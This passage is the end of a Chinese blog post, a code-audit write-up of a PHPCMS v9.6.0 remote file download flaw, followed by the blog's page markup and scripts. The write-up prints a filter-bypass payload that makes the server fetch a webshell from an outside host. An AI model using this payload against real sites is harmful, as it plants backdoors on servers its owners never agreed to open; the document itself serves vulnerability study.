class="keyword">$this</span>-&gt;fillurl($matche, $absurl, $basehref);</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">unset</span>($matches, $string);</div><div class="line">		$remotefileurls = array_unique($remotefileurls);</div><div class="line">		$oldpath = $newpath = <span class="keyword">array</span>();</div><div class="line">		<span class="keyword">foreach</span>($remotefileurls <span class="keyword">as</span> $k=&gt;$file) &#123;</div><div class="line">			<span class="keyword">if</span>(strpos($file, <span class="string">'://'</span>) === <span class="keyword">false</span> || strpos($file, $upload_url) !== <span class="keyword">false</span>) <span class="keyword">continue</span>;</div><div class="line">			$filename = fileext($file);</div><div class="line">			$file_name = basename($file);</div><div class="line">			$filename = <span class="keyword">$this</span>-&gt;getname($filename);</div><div class="line"></div><div class="line">			$newfile = $uploaddir.$filename;</div><div class="line">			$upload_func = <span class="keyword">$this</span>-&gt;upload_func;</div><div class="line">			<span class="keyword">if</span>($upload_func($file, $newfile)) &#123;</div><div class="line">				$oldpath[] = $k;</div><div class="line">				$GLOBALS[<span class="string">'downloadfiles'</span>][] = $newpath[] = $uploadpath.$filename;</div><div class="line">				@chmod($newfile, <span class="number">0777</span>);</div><div class="line">				$fileext = fileext($filename);</div><div class="line">				<span class="keyword">if</span>($watermark)&#123;</div><div class="line">					watermark($newfile, $newfile,<span class="keyword">$this</span>-&gt;siteid);</div><div class="line">				&#125;</div><div class="line">				$filepath = $dir.$filename;</div><div class="line">				$downloadedfile = <span class="keyword">array</span>(<span class="string">'filename'</span>=&gt;$filename, <span class="string">'filepath'</span>=&gt;$filepath, <span class="string">'filesize'</span>=&gt;filesize($newfile), <span class="string">'fileext'</span>=&gt;$fileext);</div><div class="line">				$aid = <span class="keyword">$this</span>-&gt;add($downloadedfile);</div><div class="line">				<span class="keyword">$this</span>-&gt;downloadedfiles[$aid] = $filepath;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">return</span> str_replace($oldpath, $newpath, $value);</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
+<p>依旧只找关键部分，先来到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$string = new_stripslashes($value);</div></pre></td></tr></table></figure></p>
+<p>拐进去看一下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">new_stripslashes</span><span class="params">($string)</span> </span>&#123;</div><div class="line">	<span class="keyword">if</span>(!is_array($string)) <span class="keyword">return</span> stripslashes($string);</div><div class="line">	<span class="keyword">foreach</span>($string <span class="keyword">as</span> $key =&gt; $val) $string[$key] = new_stripslashes($val);</div><div class="line">	<span class="keyword">return</span> $string;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>也没啥特别的，就是一个数组版的<code>stripslashes</code>函数，然后来到<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(!preg_match_all(<span class="string">"/(href|src)=([\"|']?)([^ \"'&gt;]+\.($ext))\\2/i"</span>, $string, $matches)) <span class="keyword">return</span> $value;</div></pre></td></tr></table></figure></p>
+<p>这里对我们的payload进行了正则匹配，<code>$ext</code>是一个允许的拓展名的数组，如果匹配不到就会退出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ext = &apos;gif|jpg|jpeg|bmp|png&apos;</div></pre></td></tr></table></figure></p>
+<p>这里还是挺好绕过的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">src=http://files.pupiles.com/webshell/webshell.php#.jpg</div></pre></td></tr></table></figure></p>
+<p>所以我们往下继续看<br>来到这一行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$remotefileurls[$matche] = <span class="keyword">$this</span>-&gt;fillurl($matche, $absurl, $basehref);</div></pre></td></tr></table></figure></p>
+<p>我们的url经过了一个叫做fillurl的方法处理<br>代码比较长，为了节省文章篇幅，我就截取了最重要的部分<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$surl = trim($surl);</div><div class="line">		<span class="keyword">if</span>($surl==<span class="string">''</span>) <span class="keyword">return</span> <span class="string">''</span>;</div><div class="line">		$urls = @parse_url(SITE_URL);</div><div class="line">		$HomeUrl = $urls[<span class="string">'host'</span>];</div><div class="line">		$BaseUrlPath = $HomeUrl.$urls[<span class="string">'path'</span>];</div><div class="line">		$BaseUrlPath = preg_replace(<span class="string">"/\/([^\/]*)\.(.*)$/"</span>,<span class="string">'/'</span>,$BaseUrlPath);</div><div class="line">		$BaseUrlPath = preg_replace(<span class="string">"/\/$/"</span>,<span class="string">''</span>,$BaseUrlPath);</div><div class="line">		$pos = strpos($surl,<span class="string">'#'</span>);</div><div class="line">		<span class="keyword">if</span>($pos&gt;<span class="number">0</span>) $surl = substr($surl,<span class="number">0</span>,$pos);</div></pre></td></tr></table></figure></p>
+<p>可以看到这里不仅仅对我们的url没有进行任何的过滤，还帮助我们把<code>#</code>后面的内容全部省去了，离成功又进了一步，我们调回去继续看<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$upload_func = <span class="keyword">$this</span>-&gt;upload_func;</div><div class="line">			<span class="keyword">if</span>($upload_func($file, $newfile))</div></pre></td></tr></table></figure></p>
+<p>这里我们可以看到进行了<code>$upload_func</code>函数的操作，我们在最开始可以看到该变量的赋值<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($module=<span class="string">''</span>, $catid = <span class="number">0</span>,$siteid = <span class="number">0</span>,$upload_dir = <span class="string">''</span>)</span> </span>&#123;</div><div class="line">		<span class="keyword">$this</span>-&gt;upload_func = <span class="string">'copy'</span>;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
+<p>那么思路就很清晰了，我们调用了php的<code>copy</code>方法对我们传入payload的url进行了处理。<br><img src="http://olgkg6ct5.bkt.clouddn.com/phpcms8.PNG" alt=""><br>至此漏洞复现成功(完结，撒花!)<br>(PS1:既然这里的url我们是可控的，那是不是也存在ssrf漏洞呢)<br>(PS2:网上看别的大佬复现的时候会出现mysql报错)<br><img src="http://www.hackersb.cn/usr/uploads/2017/04/2465281435.jpg" alt=""><br>然而我却只是提示个操作失败，如果有知道的师傅请留个言，谢谢</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    
+     <div>    
+      
+      <ul class="post-copyright">
+         <li class="post-copyright-link">
+          <strong>本文作者：</strong>
+          <a href="/" title="欢迎访问 Pupil 的个人博客">Pupil</a>
+        </li>
+        <li class="post-copyright-link">
+          <strong>本文标题：</strong>
+          <a href="http://pupiles.com/phpcms.html" title="PHPCMSv9.6.0任意文件下载漏洞分析">PHPCMSv9.6.0任意文件下载漏洞分析</a>
+        </li>
+        <li class="post-copyright-link">
+          <strong>本文链接：</strong>
+          <a href="http://pupiles.com/phpcms.html" title="PHPCMSv9.6.0任意文件下载漏洞分析">http://pupiles.com/phpcms.html</a>
+        </li>
+        <li class="post-copyright-date">
+            <strong>发布时间：</strong>2017年10月27日 - 15时10分
+        </li>  
+        <li class="post-copyright-license">
+          <strong>版权声明： </strong>
+          本文由 Pupil 原创，采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh" rel="license" target="_blank">保留署名-非商业性使用-禁止演绎 4.0-国际许可协议</a> </br>转载请保留以上声明信息！
+        </li>
+      </ul>
+    
+  </div>
+
+    <footer class="post-footer">
+		   
+      
+        <div class="post-tags">
+          
+            <a href="/tags/代码审计/" rel="tag"><i class="fa fa-tag"></i> 代码审计</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/suibi3.html" rel="next" title="一年">
+                <i class="fa fa-chevron-left"></i> 一年
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/typecho.html" rel="prev" title="typecho反序列化漏洞分析">
+                typecho反序列化漏洞分析 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="http://olgkg6ct5.bkt.clouddn.com/touxiang.jpg"
+               alt="Pupil" />
+          <p class="site-author-name" itemprop="name">Pupil</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+           
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">25</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">6</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+		 <br><br>
+         <span id="busuanzi_container_site_uv">
+         <b><span id="busuanzi_value_site_uv"></span></b><br>
+		 <span class="site-state-item-name">访客</span>
+         </span><br><br>
+        </nav>
+
+        
+		
+		<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=432506345&auto=0&height=66"></iframe>
+		<div align="left" font-family: "Arial","Microsoft YaHei","黑体","宋体",sans-serif>
+		<b><h1>个人简介</h1></b>
+		<p >
+		菜鸡Web狗一只，中二病患者，热爱代码审计，被CTF折磨的要死要活，拼命学习中。。。<br>
+		爱好：二次元，web渗透，偶尔会突然很文艺<br>
+		QQ：89335778
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#源码地址-https-github-com-pupiles-vulcms"><span class="nav-number">1.</span> <span class="nav-text">源码地址 https://github.com/pupiles/vulcms</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#测试环境PHPSTORM-XDEBUG-PHP5-4-firefox"><span class="nav-number">2.</span> <span class="nav-text">测试环境PHPSTORM + XDEBUG + PHP5.4 + firefox</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞url"><span class="nav-number">3.</span> <span class="nav-text">漏洞url</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞exp"><span class="nav-number">4.</span> <span class="nav-text">漏洞exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞细节"><span class="nav-number">5.</span> <span class="nav-text">漏洞细节</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Pupil</span>
+</div>
+
+
+<div class="powered-by">
+  技术支持By Pupiles
+</div>
+
+<div class="theme-info">
+  博客 -XDSEC
+</div>
+
+
+<p>Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a></p>
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+    
+    <script>
+      var cloudTieConfig = {
+        url: document.location.href, 
+        sourceId: "",
+        productKey: "70c8d4b1771e4a19bf986d2a1c098b34",
+        target: "cloud-tie-wrapper"
+      };
+    </script>
+    <script src="https://img1.ws.126.net/f2e/tie/yun/sdk/loader.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/algolia-instant-search/instantsearch.min.css">
+
+  
+  
+  <script src="/lib/algolia-instant-search/instantsearch.min.js"></script>
+  
+
+  <script src="/js/src/algolia-search.js?v=5.1.0"></script>
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("YQEVdCwfMShMt1vjaRojsYrr-gzGzoHsz", "APOpeTkajaCsoqVKYvcCMWwt");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+  
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+</body>
+</html>
